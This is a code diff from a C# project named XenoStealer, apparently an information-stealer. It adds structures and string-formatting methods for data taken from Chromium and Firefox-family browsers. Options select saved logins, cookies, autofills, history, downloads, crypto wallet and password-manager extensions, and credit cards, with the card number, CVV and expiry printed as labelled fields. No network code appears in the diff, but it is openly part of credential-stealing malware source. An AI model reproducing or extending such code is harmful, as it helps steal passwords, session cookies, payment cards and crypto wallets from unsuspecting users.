@@ -3,11 +3,237 @@ using System.Collections.Generic;
 using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
+using static XenoStealer.DataExtractionStructs;
 
 namespace XenoStealer
 {
     public static class DataExtractionStructs
     {
+
+        [Flags]
+        public enum ChromiumBrowserOptions
+        {
+            None = 0,
+            Logins = 1 << 0, // 1
+            Cookies = 1 << 1, // 2
+            Autofills = 1 << 2, // 4
+            Downloads = 1 << 3, // 8
+            History = 1 << 4, // 16
+            CreditCards = 1 << 5,// 32
+            CryptoExtensions = 1 << 6,// 64
+            PasswordManagerExtensions = 1 << 7,// 128
+            All = Logins | Cookies | Autofills | Downloads | History | CreditCards | CryptoExtensions | PasswordManagerExtensions
+        }
+
+        public struct ChromiumBrowser
+        {
+            public string browserName;
+
+            public ChromiumProfile[] profiles;
+
+            public ChromiumBrowser(ChromiumProfile[] _profiles, string _browserName)
+            {
+                browserName = _browserName;
+                if (_profiles == null)
+                {
+                    profiles = new ChromiumProfile[0];
+                }
+                else
+                {
+                    profiles = _profiles;
+                }
+            }
+
+        }
+        public struct ChromiumProfile 
+        {
+            public string profileName;
+
+            public ChromiumLogin[] logins;
+            public ChromiumCookie[] cookies;
+            public ChromiumAutoFill[] autofills;
+            public ChromiumDownload[] downloads;
+            public ChromiumHistoryEntry[] history;
+            public ChromiumCreditCard[] creditCards;
+            public ChromiumCryptoExtension[] cryptoExtensions;
+            public ChromiumPasswordExtension[] passwordManagerExtensions;
+
+
+            public ChromiumProfile(ChromiumLogin[] _logins, ChromiumCookie[] _cookies, ChromiumAutoFill[] _autofills, ChromiumDownload[] _downloads, ChromiumHistoryEntry[] _history, ChromiumCreditCard[] _creditCards, ChromiumCryptoExtension[] _cryptoExtensions, ChromiumPasswordExtension[] _passwordManagerExtensions, string _profileName)
+            {
+                profileName = _profileName;
+                if (_logins == null)
+                {
+                    logins = new ChromiumLogin[0];
+                }
+                else
+                {
+                    logins = _logins;
+                }
+
+                if (_cookies == null)
+                {
+                    cookies = new ChromiumCookie[0];
+                }
+                else
+                {
+                    cookies = _cookies;
+                }
+
+                if (_autofills == null)
+                {
+                    autofills = new ChromiumAutoFill[0];
+                }
+                else
+                {
+                    autofills = _autofills;
+                }
+
+                if (_downloads == null)
+                {
+                    downloads = new ChromiumDownload[0];
+                }
+                else
+                {
+                    downloads = _downloads;
+                }
+
+                if (_history == null)
+                {
+                    history = new ChromiumHistoryEntry[0];
+                }
+                else
+                {
+                    history = _history;
+                }
+
+                if (_creditCards == null)
+                {
+                    creditCards = new ChromiumCreditCard[0];
+                }
+                else
+                {
+                    creditCards = _creditCards;
+                }
+
+                if (_cryptoExtensions == null)
+                {
+                    cryptoExtensions = new ChromiumCryptoExtension[0];
+                }
+                else
+                {
+                    cryptoExtensions = _cryptoExtensions;
+                }
+
+                if (_passwordManagerExtensions == null)
+                {
+                    passwordManagerExtensions = new ChromiumPasswordExtension[0];
+                }
+                else
+                {
+                    passwordManagerExtensions = _passwordManagerExtensions;
+                }
+
+            }
+
+            public string GetLoginsString()
+            {
+                string result = "";
+                foreach (ChromiumLogin i in logins)
+                {
+                    result += i.ToString();
+                    result += Environment.NewLine;
+                    result += Environment.NewLine;
+                }
+                return result;
+            }
+
+            public string GetCookiesString()
+            {
+                string result = "";
+                foreach (ChromiumCookie i in cookies)
+                {
+                    result += i.ToString();
+                    result += Environment.NewLine;
+                    result += Environment.NewLine;
+                }
+                return result;
+            }
+
+            public string GetAutofillsString()
+            {
+                string result = "";
+                foreach (ChromiumAutoFill i in autofills)
+                {
+                    result += i.ToString();
+                    result += Environment.NewLine;
+                    result += Environment.NewLine;
+                }
+                return result;
+            }
+
+            public string GetDownloadsString()
+            {
+                string result = "";
+                foreach (ChromiumDownload i in downloads)
+                {
+                    result += i.ToString();
+                    result += Environment.NewLine;
+                    result += Environment.NewLine;
+                }
+                return result;
+            }
+
+            public string GetHistoryString()
+            {
+                string result = "";
+                foreach (ChromiumHistoryEntry i in history)
+                {
+                    result += i.ToString();
+                    result += Environment.NewLine;
+                    result += Environment.NewLine;
+                }
+                return result;
+            }
+
+            public string GetCreditCardsString()
+            {
+                string result = "";
+                foreach (ChromiumCreditCard i in creditCards)
+                {
+                    result += i.ToString();
+                    result += Environment.NewLine;
+                    result += Environment.NewLine;
+                }
+                return result;
+            }
+
+            public string GetCryptoExtensionsString() // this will prob never be used, but i have it anyways.
+            {
+                string result = "";
+                foreach (ChromiumCryptoExtension i in cryptoExtensions)
+                {
+                    result += i.ToString();
+                    result += Environment.NewLine;
+                    result += Environment.NewLine;
+                }
+                return result;
+            }
+
+            public string GetPasswordExtensionsString() // this will prob never be used, but i have it anyways.
+            {
+                string result = "";
+                foreach (ChromiumPasswordExtension i in passwordManagerExtensions)
+                {
+                    result += i.ToString();
+                    result += Environment.NewLine;
+                    result += Environment.NewLine;
+                }
+                return result;
+            }
+
+
+        }
 
         public struct ChromiumAutoFill
         {
@@ -117,7 +343,98 @@ namespace XenoStealer
                 return result;
             }
         }
+        public struct ChromiumHistoryEntry
+        {
+            public string url;
+            public string title;
 
+            public ChromiumHistoryEntry(string _url, string _title)
+            {
+                url = _url;
+                title = _title;
+            }
+
+            public override string ToString()
+            {
+                string result = "URL: " + url;
+                result += Environment.NewLine;
+                result += "TITLE: " + title;
+
+                return result;
+            }
+
+        }
+        public struct ChromiumCreditCard
+        {
+            public string cardholderName;
+            public string cardNumber;
+            public string cvv;
+            public int expirationMonth;
+            public int expirationYear;
+
+            public ChromiumCreditCard(string _cardholderName, string _cardNumber, string _cvv, int _expirationMonth, int _expirationYear)
+            {
+                cardholderName = _cardholderName;
+                cardNumber = _cardNumber;
+                cvv = _cvv;
+                expirationMonth = _expirationMonth;
+                expirationYear = _expirationYear;
+                
+            }
+
+            public override string ToString()
+            {
+                string result = "CARDHOLDER_NAME: " + cardholderName;
+                result += Environment.NewLine;
+                result += "CARD_NUMBER: " + cardNumber;
+                result += Environment.NewLine;
+                result += "CVV: " + cvv;
+                result += Environment.NewLine;
+                result += "EXPIRATION_MONTH: " + expirationMonth.ToString();
+                result += Environment.NewLine;
+                result += "EXPIRATION_YEAR: " + expirationYear.ToString();
+
+                return result;
+            }
+
+
+        }
+        public struct ChromiumPasswordExtension 
+        {
+            public string name;
+            public string path;
+            public ChromiumPasswordExtension(string _name, string _path) 
+            {
+                name = _name;
+                path = _path;
+            }
+
+            public override string ToString() //this will never really be used, but i decided to add anyways.
+            {
+                string result = "NAME: " + name;
+                result += Environment.NewLine;
+                result += "PATH: " + path;
+                return result;
+            }
+        }
+        public struct ChromiumCryptoExtension
+        {
+            public string name;
+            public string path;
+            public ChromiumCryptoExtension(string _name, string _path)
+            {
+                name = _name;
+                path = _path;
+            }
+
+            public override string ToString() //this will never really be used, but i decided to add anyways.
+            {
+                string result = "NAME: " + name;
+                result += Environment.NewLine;
+                result += "PATH: " + path;
+                return result;
+            }
+        }
 
         [Flags]
         public enum GeckoBrowserOptions
@@ -293,6 +610,30 @@ namespace XenoStealer
                 return result;
             }
 
+            public string GetCreditCardsString()
+            {
+                string result = "";
+                foreach (GeckoCreditCard i in creditCards)
+                {
+                    result += i.ToString();
+                    result += Environment.NewLine;
+                    result += Environment.NewLine;
+                }
+                return result;
+            }
+
+            public string GetAddressesString()
+            {
+                string result = "";
+                foreach (GeckoAddressInfo i in addresses)
+                {
+                    result += i.ToString();
+                    result += Environment.NewLine;
+                    result += Environment.NewLine;
+                }
+                return result;
+            }
+
         }
 
         public struct GeckoLogin
@@ -407,15 +748,21 @@ namespace XenoStealer
         public struct GeckoHistoryEntry
         {
             public string url;
+            public string title;
 
-            public GeckoHistoryEntry(string _url)
+            public GeckoHistoryEntry(string _url, string _title)
             {
                 url = _url;
+                title = _title;
             }
 
             public override string ToString()
             {
-                return "URL: " + url;
+                string result = "URL: " + url;
+                result += Environment.NewLine;
+                result += "TITLE: " + title;
+
+                return result;
             }
 
         }
